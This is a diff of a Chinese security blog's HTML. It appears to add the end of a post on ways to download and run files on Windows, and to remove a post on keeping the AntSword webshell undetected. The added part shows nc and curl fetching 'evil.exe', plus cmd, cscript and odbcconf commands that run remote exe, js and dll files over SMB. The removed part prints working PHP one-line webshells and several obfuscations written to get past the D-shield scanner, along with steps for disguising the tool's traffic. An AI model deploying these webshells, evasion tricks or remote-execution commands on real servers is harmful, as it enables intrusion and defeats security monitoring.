+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821145912928.png" alt="image-20200821145912928"></p>
+<p>​        在客户端执行下面的命令进行文件下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  xxxxx 4444 &gt;evil.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821150020632.png" alt="image-20200821150020632"></p>
+<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>​        有些主机上安装了curl，因此也可以使用curl进行文件下载操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;xxx:1234&#x2F;evil.exe -o test123123.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821150327583.png" alt="image-20200821150327583"></p>
+<h4 id="chfs"><a href="#chfs" class="headerlink" title="chfs"></a>chfs</h4><p>​        这款工具可以在主机上开启一个web服务，我们可以通过这个web服务对主机上的文件进行增删改查，这个方式比较适合在内网去使用。</p>
+<p>​        上传到目标主机，在某个目录下执行这个文件，即可将当前目录共享出去</p>
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821155948134.png" alt="image-20200821155948134"></p>
+<p>​        在web下访问，即可对目录下的文件进行操作。</p>
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821160044054.png" alt="image-20200821160044054"></p>
+<h3 id="SMB协议下载"><a href="#SMB协议下载" class="headerlink" title="SMB协议下载"></a>SMB协议下载</h3><h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\jerry\Desktop\test666.inf \\192.168.3.144\c$\windows\temp\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821164751755.png" alt="image-20200821164751755"></p>
+<h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>​        使用这种方式可以在本地加载远程的文件执行 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;k \\192.168.3.144\c$\windows\temp\calc.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821165453771.png" alt="image-20200821165453771"></p>
+<h4 id="cscript"><a href="#cscript" class="headerlink" title="cscript"></a>cscript</h4><p>​        使用这种方式可以加载远程的js并且执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript  \\192.168.3.144\c$\windows\temp\test.js</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821170207437.png" alt="image-20200821170207437"></p>
+<h4 id="Odbcconf"><a href="#Odbcconf" class="headerlink" title="Odbcconf"></a>Odbcconf</h4><p>​        使用这种方式可以加载远程的dll进行执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf.exe &#x2F;a &#123;regsvr \\192.168.3.144\c$\windows\temp\test.dll&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821172655915.png" alt="image-20200821172655915"></p>
+<p>​        需要注意编译的dll的版本要和windows的版本相对应。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        关于windows下文件下载的方式先总结这么多，这些文件下载方式的种类虽然非常多，还是要选择适合自己当前环境的方式来选择对应的方法利用。</p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://evi1cg.me/archives/remote_exec.html" target="_blank" rel="noopener">windows命令执行漏洞不会玩？ 看我！</a></p>
+<p><a href="https://payloads.online/archivers/2017-11-08/1#0x02-ipc" target="_blank" rel="noopener">Windows下命令行下载文件总结</a></p>
+<p><a href="https://xz.aliyun.com/t/7937#toc-3" target="_blank" rel="noopener">windows/Linux文件下载方式汇总</a></p>
 
       
     </div>
@@ -1186,307 +1352,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于蚁剑免杀的学习</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-07-26 22:39:06" itemprop="dateCreated datePublished" datetime="2020-07-26T22:39:06+08:00">2020-07-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-07-28 18:38:42" itemprop="dateModified" datetime="2020-07-28T18:38:42+08:00">2020-07-28</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当我们直接使用蚁剑这种比较出名的shell管理工具，在一些防护比较严的情况下，可能过一会会就被发现甚至关站，因此去除蚁剑的特征或者对shell免杀都是特别重要的，我之前并未接触过这方面的知识，写这篇文章的目的就是记录自己学习的一个过程，所以开始吧。</span><br></pre></td></tr></table></figure>
-
-<p>我认为特征处理有几个部分吧，一个是静态代码特征，比如我们直接使用蚁剑的马，这种马如果我们没有进行过任何处理直接上传就非常有可能在上传的时候被干掉，也就是说如果在上传的时候就被干掉了，或者上传之后被干掉了，问题都出在传的马被杀了。还有一种情况就是我们的马传上去了，而且也能访问到，然后使用蚁剑连接的时候发现连接被阻断同时马被杀了，这个就是流量方面的特征的问题了。</p>
-<h3 id="自带shell分析"><a href="#自带shell分析" class="headerlink" title="自带shell分析"></a>自带shell分析</h3><h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><p>这里首先以php为例，因为其语法变化最为灵活，也是相对来说比较容易做处理的，首先我们看下自带的马是什么样子的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$ant&#x3D;base64_decode(&quot;YXNzZXJ0&quot;);</span><br><span class="line">$ant($_POST[&#39;ant&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这个代码非常容易理解，就是将assert关键字进行base64编码，但是我使用assert这个shell会有一个问题，就是蚁剑连不上，通过抓包分析， 在蚁剑连接的时候会发送一个数据包。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727103950002.png" alt="image-20200727103950002"></p>
-<p>因为发送这个数据后返回为空，所以蚁剑显示连接不上，但是我这里将这串数据改成phpinfo()也是可以正常执行的，也就是说这里并不是因为assert不能正常执行命令的问题。我们将这串代码解码后看看,</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line"></span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">    return $out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function asoutput() &#123;</span><br><span class="line">    $output &#x3D; ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    echo &quot;97a7a&quot;;</span><br><span class="line">    echo @asenc($output);</span><br><span class="line">    echo &quot;777a7fdcd7c&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">    $D &#x3D; dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">    if ($D &#x3D;&#x3D; &quot;&quot;) $D &#x3D; dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">    $R &#x3D; &quot;&#123;$D&#125;	&quot;;</span><br><span class="line">    if (substr($D, 0, 1) !&#x3D; &quot;&#x2F;&quot;) &#123;</span><br><span class="line">        foreach(range(&quot;C&quot;, &quot;Z&quot;) as $L) if (is_dir(&quot;&#123;$L&#125;:&quot;)) $R. &#x3D; &quot;&#123;$L&#125;:&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $R. &#x3D; &quot;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $R. &#x3D; &quot;	&quot;;</span><br><span class="line">    $u &#x3D; (function_exists(&quot;posix_getegid&quot;)) ? @posix_getpwuid(@posix_geteuid()) : &quot;&quot;;</span><br><span class="line">    $s &#x3D; ($u) ? $u[&quot;name&quot;] : @get_current_user();</span><br><span class="line">    $R. &#x3D; php_uname();</span><br><span class="line">    $R. &#x3D; &quot;	&#123;$s&#125;&quot;;</span><br><span class="line">    echo $R;;</span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">    echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e - &gt; getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
-
-<p>大致的意思会输出一些内容  随机字符串+环境变量+随机字符串，如果用eval代替assert是完全没问题的，我查了下资料，assert是不能执行多个语句的，eval可以，所以这里使用assert会有返回为空的问题。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727114425121.png" alt="image-20200727114425121"></p>
-<p>这个问题可以使用base64编码的问题解决，编码后的数据包如下，可以看到ant这个参数传入的是一句话，因此就可以通过assert执行成功。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727114808620.png" alt="image-20200727114808620"></p>
-<p>这里就是蚁剑使用assert的shell的一个坑，<strong>如果使用assert不要使用默认编码。</strong></p>
-<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><p>这种方式是通过create_function创建匿名函数来执行命令的，shell的内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$ant&#x3D;create_function(&quot;&quot;, base64_decode(&#39;QGV2YWwoJF9QT1NUWyJhbnQiXSk7&#39;));</span><br><span class="line">$ant();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="php-custom-script-for-mysql"><a href="#php-custom-script-for-mysql" class="headerlink" title="php_custom_script_for_mysql"></a>php_custom_script_for_mysql</h4><p>使用这种方式的shell，需要在连接类型上选择custom，否则会连接不上。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727131327779.png" alt="image-20200727131327779"></p>
-<p>使用这种模式我们需要上传的代码是比较长的，大概13k左右。好处就是在数据包中没有明显的eval这样命令执行的名字出现，因为作者已经在custom的代码中进行了实现。比如我们要测试连接。我拿create_funcion和custom的数据包进行对比，内容如下：</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132341964.png" alt="image-20200727132341964"></p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132412642.png" alt="image-20200727132412642"></p>
-<p>为什么A就可以返回内容，我们大概分析下代码。</p>
-<p>首先获取$pwd也就是我们的密码的参数值，调用EC字符串编解码的函数进行处理</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132702622.png" alt="image-20200727132702622"></p>
-<p>根据pwd的值的不同调用不同的函数做对应的操作</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132825291.png" alt="image-20200727132825291"></p>
-<p>我们在看下BaseInfo()函数具体执行的操作，这里的代码和我们使用其他模式发送的数据是一样的，就是获取服务端的基本信息进行输出，</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132906141.png" alt="image-20200727132906141"></p>
-<p>custom模式我们大概了解了，再看下一个shell。</p>
-<h4 id="php-eval-rsa-script"><a href="#php-eval-rsa-script" class="headerlink" title="php_eval_rsa_script"></a>php_eval_rsa_script</h4><p>使用这个shell的条件是需要开启openssl的，而且我测试php5.4.45没成功，在php5.3.29下是可以的。</p>
-<p>在phpinfo中查看是否开启了openssl</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727143928992.png" alt="image-20200727143928992"></p>
-<p>开启了openssl后，我们找到蚁剑的编码管理功能，有个rsa配置的功能。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144031550.png" alt="image-20200727144031550"></p>
-<p>打开后内容如下，主要分为三个部分，RSA的公钥，私钥和php代码。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144108286.png" alt="image-20200727144108286"></p>
-<p>我们将生成的php代码传到服务端，因为这里获取数据是通过公钥解密的，所以我们需要使用私钥对我们传递的数据进行加密，因此需要创建一个编码器。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144333763.png" alt="image-20200727144333763"></p>
-<p>创建好编码器后，我们在连接的时候选择我们创建的rsa编码器即可</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144450235.png" alt="image-20200727144450235"></p>
-<p>使用rsa加密后数据包的内容如下：</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144526707.png" alt="image-20200727144526707"></p>
-<h3 id="静态免杀"><a href="#静态免杀" class="headerlink" title="静态免杀"></a>静态免杀</h3><p>首先，抛开custom类型的shell，我们发现其他的shell本质上都是构造了一个命令执行的点，所以我们只要构建一个命令执行的点就可以了。</p>
-<p>我这里以D盾来测试shell的静态免杀，我将蚁剑自带的assert那个马扔上去d盾会爆已知后门，然后我尝试将里面的关键字进行更改，已经无法造成一个命令执行的功能了，D盾还是会爆已知后门，也就是说D盾这里检测应该是进行了某些关键字的匹配的。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150401374.png" alt="image-20200727150401374"></p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150414729.png" alt="image-20200727150414729"></p>
-<p>我将第二行的内容删掉，D盾还是会爆二级，也就是说如果我们想要静态免杀完全过D盾，不能直接使用变量名做函数名这种方式。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150635040.png" alt="image-20200727150635040"></p>
-<p>而且这里和是否接收参数也无关，都会爆的。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150819212.png" alt="image-20200727150819212"></p>
-<p>我发现D盾在这里进行拦截时是会去匹配括号是否闭合的，那我们就可以测试，当我假如复杂的括号时，能否绕过这个规则。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727155255367.png" alt="image-20200727155255367"></p>
-<p>这样虽然可以达到绕过的目的，但是也不符合php的语法。所以我想将括号里的内容注释掉，不过加了注释后又会被拦截。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727162618952.png" alt="image-20200727162618952"></p>
-<p>我尝试在这些括号的两边加上单双引号，也是无法绕过的，我看网上之前有人加了反引号进行绕过，可能是版本更新了吧，我通过那种方式无法绕过，好吧，我承认这个点我绕不过去了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果没有思路了，那就是自己的知识受限了，因此我去看了看其他人的文章</span><br></pre></td></tr></table></figure>
-
-<p>有篇文章也是用了变量函数，但是并没有被拦截。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727170037503.png" alt="image-20200727170037503"></p>
-<p>所以D盾的拦截可变变量的规则是在$xx()在行首的时候，然后我试了试使用上面那种方式的shell，这个仍然还可以免杀。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($_POST[&#39;ant&#39;]));</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727171248076.png" alt="image-20200727171248076"></p>
-<p>但是能不能免杀并不是我们的重点，因为是学习嘛，所以得知道为什么他就能免杀了。一方面是上面我分析的绕过了变量函数的检测，我再测试了下，当我们不使用可变变量的形式而是直接assert调用的话是会被拦的。所以就使用了两个技术</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.变量函数的检测绕过</span><br><span class="line">2.通过变量函数来将函数关键字和函数调用部分分开了，破坏了类似于assert()这样的拦截规则。</span><br></pre></td></tr></table></figure>
-
-<p>这个是最主要的绕过的点，如果被其他的杀软拦截了，我们还可以进行各种变形。</p>
-<p><strong>方法一：关键字拆分</strong></p>
-<p>关于assert这个关键字的各种变形</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;&#39;a&#39;.&#39;s&#39;.&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;;   &#x2F;&#x2F;拼接</span><br><span class="line">$a &#x3D; substr(&#39;1a&#39;,1).substr(&#39;1as&#39;,2).&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;; &#x2F;&#x2F;拼接+截取</span><br><span class="line">$a &#x3D; strtr(&#39;azxcvt&#39;,&#39;zxcv&#39;,&#39;sser&#39;);&#x2F;&#x2F;截取替换</span><br><span class="line">$a &#x3D; substr_replace(&quot;asxxx&quot;,&quot;sert&quot;,2); &#x2F;&#x2F;替换</span><br><span class="line">$a&#x3D;chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);</span><br></pre></td></tr></table></figure>
-
-<p><strong>方法二：改变调用函数</strong></p>
-<p>上面的shell我们是调用assert达到代码执行的目的，那么有没有那个函数可以替换assert这个函数呢。本来以为会有很多函数，查了下发现没有那种可以直接调用的，不过可以通过一些回调函数来解决。我以call_user_func为例</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;call_user_func&quot;;</span><br><span class="line">$c&#x3D;&quot;assert&quot;;</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($c,$_POST[&#39;ant&#39;]));</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>当然也可以拿其他函数进行变形绕过，这里只是给一个思路。</p>
-<p><strong>方法三：改变array+var_dump</strong></p>
-<p>通过前面的绕过，我们知道这种绕过Dd盾方法的核心在于可变函数的调用方式没有被检测出来，也就是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(&#39;&#39;&#x3D;&gt;$a($c,$_POST[&#39;ant&#39;]));</span><br></pre></td></tr></table></figure>
-
-<p>那么我们在这部分要绕过的点就是有没有哪些调用方式可以放在可变函数的前面，我尝试写个自定义函数来进行绕过，但是使用这种方法不能绕过。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727214520026.png" alt="image-20200727214520026"></p>
-<p>之前我们调用的是var_dump,也可以调用其他方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($_POST[&#39;ant&#39;]));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>还可以这样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a&#x3D;&quot;assert&quot;;</span><br><span class="line">	$arr &#x3D; new ArrayObject(array(&#39;&#39;&#x3D;&gt;$a($_POST[&#39;ant&#39;])));</span><br><span class="line">	$arr-&gt;uksort();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>好了，关于静态免杀先学到这，其他的方式当然还有很多，我只是挑了一个点而已。</p>
-<h3 id="动态免杀"><a href="#动态免杀" class="headerlink" title="动态免杀"></a>动态免杀</h3><p>上面的操作只是帮我们过了一个shell查杀工具的静态查杀，但是有时候会有这样的情况，就是shell传上去好好的，也没杀，只要一连接就被干掉了，这是为什么呢？这个就涉及到流量方面的免杀了。</p>
-<h4 id="特征去除"><a href="#特征去除" class="headerlink" title="特征去除"></a>特征去除</h4><p>关于蚁剑这款工具，功能很强大，用起来也挺舒服，但是他出名啊，出名的话就会被很多厂商拿去分析，所以我们在使用蚁剑的时候需要去除我们使用蚁剑和服务端进行交互的流量特征，那么都有什么特征呢？</p>
-<h5 id="特征一：user-agent"><a href="#特征一：user-agent" class="headerlink" title="特征一：user-agent"></a>特征一：user-agent</h5><p>​    这个特征是一个非常明显的特征，就和sqlmap的user-agent一样，都是和工具相关的，我们看下：</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090059610.png" alt="image-20200728090059610"></p>
-<p>这个特征非常明显吧，所以我们使用蚁剑这个特征是一定要改的，我们找到/modules/request.js文件，有个USER_AGENT</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090412292.png" alt="image-20200728090412292"></p>
-<p>我们将它改成百度的爬虫</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla&#x2F;5.0 (compatible; Baiduspider-render&#x2F;2.0;+http:&#x2F;&#x2F;www.baidu.com&#x2F;search&#x2F;spider.html)</span><br></pre></td></tr></table></figure>
-
-<p>网上还有人说，需要更改/modules/update.js的请求头，但我看了下这个功能是和github进行交互的，不是和目标交互的流量，所以我认为可以不改吧。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090753980.png" alt="image-20200728090753980"></p>
-<p>然后重启蚁剑，USER-AGENT内容就已经成功被修改了。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728091048839.png" alt="image-20200728091048839"></p>
-<h5 id="特征二：变量规则"><a href="#特征二：变量规则" class="headerlink" title="特征二：变量规则"></a>特征二：变量规则</h5><p>首先来看下蚁剑的一个数据包，注意看下我圈出来的部分，这里面字符的长度是固定的，在变量那部分，长度是固定的14位，返回包部分前面是9位，后面是7位。</p>
-<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728091745973.png" alt="image-20200728091745973"></p>
